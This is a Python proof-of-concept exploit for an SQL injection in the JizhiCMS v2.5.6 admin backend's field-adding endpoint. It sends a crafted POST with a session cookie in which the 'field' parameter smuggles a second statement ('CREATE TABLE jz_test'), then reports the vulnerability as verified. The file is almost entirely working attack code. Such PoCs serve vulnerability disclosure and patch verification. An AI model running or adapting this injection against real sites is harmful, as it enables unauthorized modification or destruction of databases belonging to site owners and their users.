#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JizhiCMS v2.5.6 Admin Backend DDL SQL Injection POC
Author: https://github.com/ifraise/
"""

import requests

# Target
BASE_URL = "http://127.0.0.1"

# HTTP Request
headers = {
    "Host": "127.0.0.1",
    "sec-ch-ua": '"Chromium";v="113", "Not-A.Brand";v="24"',
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
    "sec-ch-ua-platform": '"Windows"',
    "Origin": "http://127.0.0.1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://127.0.0.1/index.php/admins/Fields/addFields.html?molds=article",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "PHPSESSID=7ahbeir7j7cgvv0dlesrg3gj5s",
    "Connection": "close"
}

# POST Data
data = {
    "go": "1",
    "molds": "article",
    "fieldname": "testmingcheng",
    "field": "a INT; CREATE TABLE jz_test (id INT PRIMARY KEY AUTO_INCREMENT); --+",
    "fieldtype": "1",
    "fieldlong_1": "255",
    "fieldlong_2": "500",
    "fieldlong_3": "不限",
    "fieldlong_15": "不限",
    "fieldlong_4": "11",
    "fieldlong_14": "10,2",
    "body_14": "0.00",
    "fieldlong_11": "11",
    "fieldlong_5": "255",
    "fieldlong_6": "不限",
    "fieldlong_7": "500",
    "body_7": "",
    "fieldlong_12": "500",
    "body_12": "",
    "fieldlong_8": "500",
    "body_8": "",
    "fieldlong_9": "255",
    "fieldlong_10": "不限",
    "fieldlong_13": "11",
    "molds_select": "请选择关联模型",
    "molds_list_field": "",
    "field_remote_13": "1",
    "fieldlong_16": "255",
    "molds_select_muti": "请选择关联模型",
    "molds_list_field_muti": "",
    "field_remote_16": "1",
    "fieldlong_21": "11",
    "molds_select_tid": "请选择栏目",
    "molds_list_field_tid": "",
    "field_remote_21": "1",
    "fieldlong_20": "255",
    "molds_select_tid_muti": "请选择栏目",
    "molds_list_field_tid_muti": "",
    "field_remote_20": "1",
    "fieldlong_17": "11",
    "fieldlong_18": "255",
    "fieldlong_19": "255",
    "vdata": "",
    "tips": "",
    "orders": "100",
    "ismust": "0",
    "isshow": "1",
    "ishome": "1",
    "isadmin": "1",
    "issearch": "0",
    "islist": "0",
    "format": "不聚合处理",
    "isajax": "1",
    "ldfield": "",
    "linkfield": "",
    "tids": "2,8,9,5"
}

def exploit():
    print("=" * 50)
    print(" JizhiCMS v2.5.6 DLL SQL Injection POC")
    print(" Author: https://github.com/ifraise/")
    print("=" * 50)
    
    url = f"{BASE_URL}/index.php/admins/Fields/addFields.html?molds=article"
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        print("[+] Check database in Mysql: Table 'jz_test' created")
        print("[+] Vulnerability verified successfully！")
    else:
        print("[-] Request failed！")

if __name__ == "__main__":
    exploit()